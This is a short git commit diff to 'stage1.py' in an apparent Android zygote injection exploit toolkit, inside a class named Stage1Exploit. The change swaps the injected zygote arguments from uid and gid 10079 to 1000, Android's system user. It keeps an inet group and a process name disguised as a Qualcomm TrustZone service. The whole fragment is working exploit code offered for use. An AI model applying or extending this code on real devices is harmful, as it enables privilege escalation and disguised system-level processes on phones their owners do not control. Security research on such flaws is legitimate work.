2aff53318ce171beba33e2374aaa6049d82578d0
コアラ <189215038+coara-chocomaru@users.noreply.github.com>
2026-08-31 18:44:54 +0900

    Update stage1.py

--- zygote_injection_toolkit/stage1.py
+++ zygote_injection_toolkit/stage1.py
@@ -189,8 +189,8 @@ class Stage1Exploit:
         assert "," not in command
         # TODO let you specify the SELinux context through command line arguments
         raw_zygote_arguments = [
-            "--setuid=10079",
-            "--setgid=10079",
+            "--setuid=1000",
+            "--setgid=1000",
             "--setgroups=3003",
             "--target-sdk-version=28",
             "--nice-name=com.qualcomm.qti.qms.service.trustzoneaccess",
